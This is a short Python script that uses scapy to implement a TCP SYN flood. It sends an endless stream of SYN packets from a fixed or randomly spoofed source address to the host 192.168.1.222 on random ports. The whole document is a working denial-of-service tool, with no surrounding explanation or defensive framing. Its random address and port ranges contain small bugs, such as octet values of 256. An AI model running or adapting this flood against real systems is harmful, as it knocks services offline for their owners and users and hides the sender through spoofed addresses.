#syn flood implementation
from scapy.all import *
import random
import sys

source_ip = ""
if sys.argv[1] == "1":
	source_ip = "192.168.1.111"
else:
	source_ip = str(random.randint(0, 256)) + "." + str(random.randint(0, 256)) + "." + str(random.randint(0, 256)) + "." + str(random.randint(0, 256))

while 1:
	syn_ip_packet = IP(src = source_ip, dst = "192.168.1.222", ttl = 100)
	syn_tcp_packet = TCP(sport = random.randint(0, 65536), dport = random.randint(1500, 6000), flags = "S", seq = 1111, ack = 1111, window = 1111)
	send(syn_ip_packet/syn_tcp_packet)